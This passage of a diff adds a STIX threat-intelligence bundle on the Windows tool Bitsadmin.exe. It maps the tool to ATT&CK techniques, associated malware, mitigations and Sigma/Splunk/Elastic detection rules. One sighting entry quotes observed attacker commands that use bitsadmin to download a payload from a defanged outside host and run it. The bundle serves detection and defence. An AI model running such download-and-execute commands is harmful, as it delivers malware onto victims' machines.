+          "kill_chain_name": "mitre-attack",
+          "phase_name": "defense-evasion"
+        },
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "persistence"
+        }
+      ]
+    },
+    {
+      "name": "Exfiltration Over Unencrypted Non-C2 Protocol",
+      "description": "Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.(Citation: copy_cmd_cisco)\n\nAdversaries may opt to obfuscate this data, without the use of encryption, within network protocols that are natively unencrypted (such as HTTP, FTP, or DNS). This may include custom or publicly available encoding/compression algorithms (such as base64) as well as embedding data within protocol headers and fields. ",
+      "id": "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
+      "type": "attack-pattern",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2020-03-15T15:37:47.583Z",
+      "modified": "2023-04-12T23:39:25.476Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/techniques/T1048/003",
+          "external_id": "T1048.003"
+        },
+        {
+          "source_name": "copy_cmd_cisco",
+          "description": "Cisco. (2022, August 16). copy - Cisco IOS Configuration Fundamentals Command Reference . Retrieved July 13, 2022.",
+          "url": "https://www.cisco.com/c/en/us/td/docs/ios-xml/ios/fundamentals/command/cf_command_ref/C_commands.html#wp1068167689"
+        },
+        {
+          "source_name": "University of Birmingham C2",
+          "description": "Gardiner, J.,  Cova, M., Nagaraja, S. (2014, February). Command & Control Understanding, Denying and Detecting. Retrieved April 20, 2016.",
+          "url": "https://arxiv.org/ftp/arxiv/papers/1408/1408.1136.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "kill_chain_phases": [
+        {
+          "kill_chain_name": "mitre-attack",
+          "phase_name": "exfiltration"
+        }
+      ]
+    },
+    {
+      "name": "Associated APTs",
+      "description": "APTs been observed using LOLBin tool Bitsadmin.exe",
+      "id": "grouping--c3cf2264-d864-4066-9b00-62553bb57ca8",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "intrusion-set--6566aac9-dad8-4332-ae73-20c23bad7f02",
+        "intrusion-set--f29b7c5e-2439-42ad-a86f-9f8984fafae3",
+        "intrusion-set--18854f55-ac7c-4634-bd9a-352dd07613b7",
+        "intrusion-set--7113eaa5-ba79-4fb3-b68a-398ee9cd698e",
+        "intrusion-set--56319646-eb6e-41fc-ae53-aadfa7adb924",
+        "intrusion-set--dd2d9ca6-505b-4860-a604-233685b802c7"
+      ]
+    },
+    {
+      "source_ref": "grouping--c3cf2264-d864-4066-9b00-62553bb57ca8",
+      "target_ref": "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--353b9d38-dea1-40c0-b89c-b05b39f311cf",
+      "targetObjectType": "grouping"
+    },
+    {
+      "name": "Associated TTPs",
+      "description": "TTPs been used by LOLBin tool Bitsadmin.exe",
+      "id": "grouping--bdf2d33c-3337-4198-9e24-12a6d4033dcc",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "attack-pattern--fb8d023d-45be-47e9-bc51-f56bcae6435b",
+        "attack-pattern--bf90d72c-c00b-45e3-b3aa-68560560d4c5",
+        "attack-pattern--c8e87b83-edbb-48d4-9295-4974897525b7",
+        "attack-pattern--e6919abc-99f9-4c6c-95a5-14761e7b2add"
+        
+      ]
+    },
+    {
+      "source_ref": "grouping--bdf2d33c-3337-4198-9e24-12a6d4033dcc",
+      "target_ref": "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--14684936-d159-4a42-aff7-7b1ab39ec9e0",
+      "targetObjectType": "grouping"
+    },
+    {
+      "id": "file--9b4878d9-e11a-4b02-8d3e-d998041d8a72",
+      "type": "file",
+      "spec_version": "2.1",
+      "name": "Bitsadmin.exe",
+      "parent_directory_ref": [
+        "directory--3744a498-7c6e-49c6-b71a-c97548eb5806",
+        "directory--33456c8b-e014-4c05-86e9-93f6957c79f5"
+      ]
+    },
+    {
+      "id": "directory--3744a498-7c6e-49c6-b71a-c97548eb5806",
+      "type": "directory",
+      "spec_version": "2.1",
+      "path": "c:\\windows\\system32\\bitsadmin.exe"
+    },
+    {
+      "id": "directory--33456c8b-e014-4c05-86e9-93f6957c79f5",
+      "type": "directory",
+      "spec_version": "2.1",
+      "path": "c:\\windows\\syswow64\\bitsadmin.exe"
+    },
+    {
+      "id": "observed-data--a71f19ea-018a-447b-b68f-c77e4cd9adae",
+      "type": "observed-data",
+      "spec_version": "2.1",
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "22023-09-05T23:23:32+01:00",
+      "first_observed": "2019-12-15T23:23:32+01:00",
+      "last_observed": "2023-09-05T23:23:32+01:00",
+      "number_observed": 12,
+      "object_refs": [
+        "file--9b4878d9-e11a-4b02-8d3e-d998041d8a72"
+      ]
+    },
+    {
+      "description": "Bitsadmin is a command-line tool used to create, download or upload jobs, and to monitor their progress. The bitsadmin tool uses switches to identify the work to perform. You can call bitsadmin /? or bitsadmin /help to get a list of switches.",
+      "pattern": "[file:hashes.'SHA-256' = '739B2DD012EA183895CC01116906F339C9AA1C0BAABF6F22C8E59E25A0C12917']",
+      "id": "indicator--eab8ee5d-5ff1-4701-bd11-09845b4a2584",
+      "type": "indicator",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "name": "01AAB62D5799F75B0D69EB29C1CA6855",
+      "pattern_type": "stix",
+      "valid_from": "2017-06-02T18:02:03+01:00",
+      "valid_until": "2023-08-20T18:02:03+01:00"
+    },
+    {
+      "name": "Filter Network Traffic",
+      "description": "Use network appliances to filter ingress or egress traffic and perform protocol-based filtering. Configure software on endpoints to filter network traffic.",
+      "id": "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d",
+      "type": "course-of-action",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2019-06-11T16:33:55.337Z",
+      "modified": "2020-06-20T20:46:36.342Z",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1037",
+          "url": "https://attack.mitre.org/mitigations/M1037"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "Operating System Configuration",
+      "description": "Make configuration changes related to the operating system or a common feature of the operating system that result in system hardening against techniques.",
+      "id": "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3",
+      "type": "course-of-action",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2019-06-06T21:16:18.709Z",
+      "modified": "2023-03-31T17:27:28.395Z",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/mitigations/M1028",
+          "external_id": "M1028"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "name": "User Account Management",
+      "description": "Manage the creation, modification, use, and permissions associated to user accounts.",
+      "id": "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317",
+      "type": "course-of-action",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "created": "2019-06-06T16:50:58.767Z",
+      "modified": "2020-05-20T13:49:12.270Z",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1018",
+          "url": "https://attack.mitre.org/mitigations/M1018"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ]
+    },
+    {
+      "source_ref": "indicator--eab8ee5d-5ff1-4701-bd11-09845b4a2584",
+      "target_ref": "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+      "relationship_type": "indicates",
+      "type": "relationship",
+      "created": "2023-09-12T13:45:03.075Z",
+      "modified": "2023-09-12T13:45:03.076Z",
+      "id": "relationship--65f5f969-7c74-4866-af9e-f043dd67094b",
+      "targetObjectType": "tool"
+    },
+    {
+      "source_ref": "indicator--eab8ee5d-5ff1-4701-bd11-09845b4a2584",
+      "target_ref": "observed-data--a71f19ea-018a-447b-b68f-c77e4cd9adae",
+      "relationship_type": "based-on",
+      "type": "relationship",
+      "created": "2023-08-20T19:59:49.268Z",
+      "modified": "2023-08-20T19:59:49.268Z",
+      "id": "relationship--489b2b92-71d7-4228-af74-2e8ad490fc15",
+      "targetObjectType": "indicator"
+    },
+    {
+      "name": "Data Loss Prevention",
+      "description": "Use a data loss prevention (DLP) strategy to categorize sensitive data, identify data formats indicative of personal identifiable information (PII), and restrict exfiltration of sensitive data.(Citation: PurpleSec Data Loss Prevention)",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--65401701-019d-44ff-b223-08d520bb0e7b",
+      "type": "course-of-action",
+      "created": "2021-08-04T21:22:11.612Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1057",
+          "url": "https://attack.mitre.org/mitigations/M1057"
+        },
+        {
+          "source_name": "PurpleSec Data Loss Prevention",
+          "url": "https://purplesec.us/data-loss-prevention/",
+          "description": "Michael Swanagan. (2020, October 24). 7 Data Loss Prevention Best Practices & Strategies. Retrieved August 30, 2021."
+        }
+      ],
+      "modified": "2021-08-30T15:00:10.680Z",
+      "x_mitre_version": "1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Network Intrusion Prevention",
+      "description": "Use intrusion detection signatures to block traffic at network boundaries.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c",
+      "type": "course-of-action",
+      "created": "2019-06-10T20:46:02.263Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1031",
+          "url": "https://attack.mitre.org/mitigations/M1031"
+        }
+      ],
+      "modified": "2019-06-10T20:46:02.263Z",
+      "x_mitre_version": "1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "Network Segmentation",
+      "description": "Architect sections of the network to isolate critical systems, functions, or resources. Use physical and logical segmentation to prevent access to potentially sensitive systems and information. Use a DMZ to contain any internet-facing services that should not be exposed from the internal network. Configure separate virtual private cloud (VPC) instances to isolate critical cloud systems.",
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c",
+      "type": "course-of-action",
+      "created": "2019-06-10T20:41:03.271Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "external_id": "M1030",
+          "url": "https://attack.mitre.org/mitigations/M1030"
+        }
+      ],
+      "modified": "2020-05-14T13:05:39.500Z",
+      "x_mitre_version": "1.1",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "id": "grouping--fa64b113-4e6b-41d9-aa51-e58a8150e64f",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "name": "Associated Mitigations",
+      "description": "Associated Mitigations",
+      "context": "unspecified",
+      "object_refs": [
+        "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+        "course-of-action--20f6a9df-37c4-4e20-9e47-025983b1b39d",
+        "course-of-action--86598de0-b347-4928-9eb0-0acbfc21908c",
+        "course-of-action--12241367-a8b7-49b4-b86e-2236901ba50c",
+        "course-of-action--65401701-019d-44ff-b223-08d520bb0e7b",
+        "course-of-action--2f316f6c-ae42-44fe-adf8-150989e0f6d3",
+        "course-of-action--93e7968a-9074-4eac-8ae9-9f5200ec3317"
+      ]
+    },
+    {
+      "modified": "2023-03-07T13:05:11.028Z",
+      "name": "Cobalt Strike",
+      "description": "[Cobalt Strike](https://attack.mitre.org/software/S0154) is a commercial, full-featured, remote access tool that bills itself as “adversary simulation software designed to execute targeted attacks and emulate the post-exploitation actions of advanced threat actors”. Cobalt Strike’s interactive post-exploit capabilities cover the full range of ATT&CK tactics, all executed within a single, integrated system.(Citation: cobaltstrike manual)\n\nIn addition to its own capabilities, [Cobalt Strike](https://attack.mitre.org/software/S0154) leverages the capabilities of other well-known tools such as Metasploit and [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: cobaltstrike manual)",
+      "x_mitre_platforms": [
+        "Windows",
+        "Linux",
+        "macOS"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "1.10",
+      "x_mitre_contributors": [
+        "Martin Sohn Christensen, Improsec",
+        "Josh Abraham"
+      ],
+      "x_mitre_aliases": [
+        "Cobalt Strike"
+      ],
+      "type": "malware",
+      "id": "malware--a7881f21-e978-4fe4-af56-92c9416a2616",
+      "created": "2017-12-14T16:46:06.044Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0154",
+          "external_id": "S0154"
+        },
+        {
+          "source_name": "cobaltstrike manual",
+          "description": "Strategic Cyber LLC. (2017, March 14). Cobalt Strike Manual. Retrieved May 24, 2017.",
+          "url": "https://web.archive.org/web/20210825130434/https://cobaltstrike.com/downloads/csmanual38.pdf"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2021-10-14T21:39:11.008Z",
+      "name": "Egregor",
+      "description": "[Egregor](https://attack.mitre.org/software/S0554) is a Ransomware-as-a-Service (RaaS) tool that was first observed in September 2020. Researchers have noted code similarities between [Egregor](https://attack.mitre.org/software/S0554) and Sekhmet ransomware, as well as [Maze](https://attack.mitre.org/software/S0449) ransomware.(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)(Citation: Security Boulevard Egregor Oct 2020)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_contributors": [
+        "Daniyal Naeem, BT Security",
+        "Matt Brenton, Zurich Insurance Group"
+      ],
+      "x_mitre_aliases": [
+        "Egregor"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--cc4c1287-9c86-4447-810c-744f3880ec37",
+      "type": "malware",
+      "created": "2020-12-29T21:32:27.939Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0554",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0554"
+        },
+        {
+          "source_name": "Egregor",
+          "description": "(Citation: NHS Digital Egregor Nov 2020)(Citation: Cyble Egregor Oct 2020)"
+        },
+        {
+          "source_name": "NHS Digital Egregor Nov 2020",
+          "url": "https://digital.nhs.uk/cyber-alerts/2020/cc-3681#summary",
+          "description": "NHS Digital. (2020, November 26). Egregor Ransomware The RaaS successor to Maze. Retrieved December 29, 2020."
+        },
+        {
+          "source_name": "Cyble Egregor Oct 2020",
+          "url": "https://cybleinc.com/2020/10/31/egregor-ransomware-a-deep-dive-into-its-activities-and-techniques/",
+          "description": "Cybleinc. (2020, October 31). Egregor Ransomware – A Deep Dive Into Its Activities and Techniques. Retrieved December 29, 2020."
+        },
+        {
+          "source_name": "Security Boulevard Egregor Oct 2020",
+          "url": "https://securityboulevard.com/2020/10/egregor-sekhmets-cousin/",
+          "description": "Meskauskas, T.. (2020, October 29). Egregor: Sekhmet’s Cousin. Retrieved January 6, 2021."
+        }
+      ],
+      "x_mitre_version": "1.0",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "modified": "2020-03-30T18:24:01.572Z",
+      "name": "UBoatRAT",
+      "description": "[UBoatRAT](https://attack.mitre.org/software/S0333) is a remote access tool that was identified in May 2017.(Citation: PaloAlto UBoatRAT Nov 2017)",
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_aliases": [
+        "UBoatRAT"
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "id": "malware--518bb5f1-91f4-4ff2-b09d-5a94e1ebe95f",
+      "type": "malware",
+      "created": "2019-01-29T19:09:26.355Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "external_references": [
+        {
+          "external_id": "S0333",
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0333"
+        },
+        {
+          "source_name": "UBoatRAT",
+          "description": "(Citation: PaloAlto UBoatRAT Nov 2017)"
+        },
+        {
+          "source_name": "PaloAlto UBoatRAT Nov 2017",
+          "description": "Hayashi, K. (2017, November 28). UBoatRAT Navigates East Asia. Retrieved January 12, 2018.",
+          "url": "https://researchcenter.paloaltonetworks.com/2017/11/unit42-uboatrat-navigates-east-asia/"
+        }
+      ],
+      "x_mitre_version": "1.1",
+      "x_mitre_attack_spec_version": "2.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    
+    {
+      "name": "Associated commands",
+      "description": "The associated Bitsadmin commands that has been used by the threat actors:  \"cmd /c bitsadmin /transfer MyJob hxxps://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x92dp.png C:\\\\Users\\\\Public\\\\11.png\",\n        \"cmd /c bitsadmin /transfer bbbb hxxp://66.42.98[.]220:12345/test/install.bat C:\\\\Users\\\\Public\\\\install.bat\",\n        \"C:\\\\Windows\\\\System32\\\\cmd.exe %windir% /c explorer.exe & bitsadmin.exe /transfer /priority high hxxp://av.ka289cisce[.]org/rh72.bin %AppData%\\file.exe & %AppData%\\file.exe\",\n        \"cmd.exe /c bitsadmin /transfer <REDACTED> \\\\10.<REDACTED>\\\\share$\\\\<REDACTED>.exe C:\\\\Users\\\\<REDACTED>\\\\AppData\\\\Roaming\\\\<REDACTED>.exe\"",
+      "id": "sighting--ef205e01-fb2b-488a-b358-1effcd3013fe",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--64764dc6-a032-495f-8250-1e4c06bdc163"
+      ]
+    },
+    {
+      "name": "Associated Malware",
+      "description": "Malware been observed using LOLBin tool Bitsadmin.exe",
+      "type": "grouping",
+      "spec_version": "2.1",
+      "id": "grouping-79312ab8-4c85-4caf-b8d9-f3e545bfa633",
+      "created": "2023-08-20T17:34:58.798Z",
+      "modified": "2023-08-20T17:34:58.798Z",
+      "context": "suspicious-activity",
+      "object_refs": [
+        "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6",
+        "malware--518bb5f1-91f4-4ff2-b09d-5a94e1ebe95f",
+        "malware--cc4c1287-9c86-4447-810c-744f3880ec37",
+        "malware--a7881f21-e978-4fe4-af56-92c9416a2616"
+      ]
+    },
+    {
+      "source_ref": "grouping-79312ab8-4c85-4caf-b8d9-f3e545bfa633",
+      "target_ref": "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+      "relationship_type": "uses",
+      "type": "relationship",
+      "created": "2023-08-20T18:53:57.511Z",
+      "modified": "2023-08-20T18:53:57.511Z",
+      "id": "relationship--1488c54b-e339-4cc0-8b6f-791a815098d2",
+      "targetObjectType": "grouping"
+    },
+    {
+      "modified": "2023-03-21T21:20:23.717Z",
+      "name": "Astaroth",
+      "description": "[Astaroth](https://attack.mitre.org/software/S0373) is a Trojan and information stealer known to affect companies in Europe, Brazil, and throughout Latin America. It has been known publicly since at least late 2017. (Citation: Cybereason Astaroth Feb 2019)(Citation: Cofense Astaroth Sept 2018)(Citation: Securelist Brazilian Banking Malware July 2020)",
+      "x_mitre_platforms": [
+        "Windows"
+      ],
+      "x_mitre_deprecated": false,
+      "x_mitre_domains": [
+        "enterprise-attack"
+      ],
+      "x_mitre_version": "2.1",
+      "x_mitre_contributors": [
+        "Carlos Borges, @huntingneo, CIP"
+      ],
+      "x_mitre_aliases": [
+        "Astaroth",
+        "Guildma"
+      ],
+      "type": "malware",
+      "id": "malware--edb24a93-1f7a-4bbf-a738-1397a14662c6",
+      "created": "2019-04-17T13:46:38.565Z",
+      "created_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5",
+      "revoked": false,
+      "external_references": [
+        {
+          "source_name": "mitre-attack",
+          "url": "https://attack.mitre.org/software/S0373",
+          "external_id": "S0373"
+        },
+        {
+          "source_name": "Guildma",
+          "description": "(Citation: Securelist Brazilian Banking Malware July 2020)"
+        },
+        {
+          "source_name": "Cofense Astaroth Sept 2018",
+          "description": "Doaty, J., Garrett, P.. (2018, September 10). We’re Seeing a Resurgence of the Demonic Astaroth WMIC Trojan. Retrieved April 17, 2019.",
+          "url": "https://cofense.com/seeing-resurgence-demonic-astaroth-wmic-trojan/"
+        },
+        {
+          "source_name": "Securelist Brazilian Banking Malware July 2020",
+          "description": "GReAT. (2020, July 14). The Tetrade: Brazilian banking malware goes global. Retrieved November 9, 2020.",
+          "url": "https://securelist.com/the-tetrade-brazilian-banking-malware/97779/"
+        },
+        {
+          "source_name": "Cybereason Astaroth Feb 2019",
+          "description": "Salem, E. (2019, February 13). ASTAROTH MALWARE USES LEGITIMATE OS AND ANTIVIRUS PROCESSES TO STEAL PASSWORDS AND PERSONAL DATA. Retrieved April 17, 2019.",
+          "url": "https://www.cybereason.com/blog/information-stealing-malware-targeting-brazil-full-research"
+        }
+      ],
+      "object_marking_refs": [
+        "marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168"
+      ],
+      "labels": [
+        "malware"
+      ],
+      "x_mitre_attack_spec_version": "3.1.0",
+      "x_mitre_modified_by_ref": "identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5"
+    },
+    {
+      "name": "(Sigma|Splunk|ELK)",
+      "description": "\"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_susp_extensions.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_download_file_sharing_domains.yml\",\n        \"https://raw.githubusercontent.com/SigmaHQ/sigma/master/rules/windows/process_creation/proc_creation_win_bitsadmin_potential_persistence.yml\",\n        \"https://raw.githubusercontent.com/splunk/security_content/develop/detections/endpoint/bitsadmin_download_file.yml\",\n        \"https://raw.githubusercontent.com/splunk/security_content/develop/dev/endpoint/office_product_spawning_bitsadmin.yml\",\n        \"https://raw.githubusercontent.com/elastic/detection-rules/main/rules_building_block/command_and_control_bitsadmin_activity.toml\"",
+      "id": "course-of-action--1c0ed64c-7c25-4d77-813c-ba86d5f39694",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "Sigma",
+          "url": "https://github.com/SigmaHQ/sigma/tree/master/rules"
+        },
+        {
+          "source_name": "Splunk",
+          "url": "https://github.com/splunk/security_content"
+        },
+        {
+          "source_name": "Elastic",
+          "url": "https://github.com/elastic/detection-rules"
+        }
+      ]
+    },
+    {
+      "name": "(Sysmon|windowsEventId)",
+      "description": "\"T1197:process:process_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:1\",\n            \"T1197:network_traffic:network_connection_creation:log_channel:Microsoft-Windows-Sysmon/Operational:log_provider:Microsoft-Windows-Sysmon:3\",\n            \"T1197:process:process_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:4688\",\n            \"T1197:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5156\",\n            \"T1197:network_traffic:network_connection_creation:log_channel:Security:log_provider:Microsoft-Windows-Security-Auditing:5157\"",
+      "id": "course-of-action--4144504a-844c-4abe-9919-c0344fa95126",
+      "type": "course-of-action",
+      "spec_version": 2.1,
+      "created": "2023-08-20T18:02:03+01:00",
+      "modified": "2023-08-20T18:02:03+01:00",
+      "external_references": [
+        {
+          "source_name": "OSSEM-DM",
+          "url": "https://github.com/OTRF/OSSEM-DM/blob/03404288803c743cd5254f8888d664a5a106ec89/use-cases/mitre_attack/techniques_to_events_mapping.yaml"
+        }
+      ]
+    },
+    {
+      "id": "grouping--2ba43514-4e39-49b4-a79a-380a2b25c535",
+      "type": "grouping",
+      "spec_version": 2.1,
+      "created": "2023-09-05T23:23:32+01:00",
+      "modified": "2023-09-05T23:23:32+01:00",
+      "name": "Associated Detections",
+      "description": "Associated Detections",
+      "context": "unspecified",
+      "object_refs": [
+        "tool--64764dc6-a032-495f-8250-1e4c06bdc163",
+        "course-of-action--4144504a-844c-4abe-9919-c0344fa95126",
+        "course-of-action--1c0ed64c-7c25-4d77-813c-ba86d5f39694"
+      ]
+    },
+    {
+      "name": "Relationship Tools->TTPs",
+      "description": "\"[BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload and/or download files.(Citation: Microsoft BITSAdmin)\",\n\"[BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to launch a malicious process.(Citation: TrendMicro Tropic Trooper Mar 2018)\",\n\"[BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload and/or download files from SMB file servers.(Citation: Microsoft About BITS)\",\n\"[BITSAdmin](https://attack.mitre.org/software/S0190) can be used to create [BITS Jobs](https://attack.mitre.org/techniques/T1197) to upload files from a compromised host.(Citation: Microsoft BITSAdmin)\"",
+      "id": "sighting--1907d9cf-fdae-4efa-b0bd-55a05ce1efdf",
+      "type": "sighting",
+      "spec_version": 2.1,
+      "created": "2023-09-20T18:02:03+01:00",
+      "modified": "2023-09-20T18:02:03+01:00",
+      "sighting_of_ref": [
+        "tool--64764dc6-a032-495f-8250-1e4c06bdc163"
+      ]
+    }
+  ]
+}
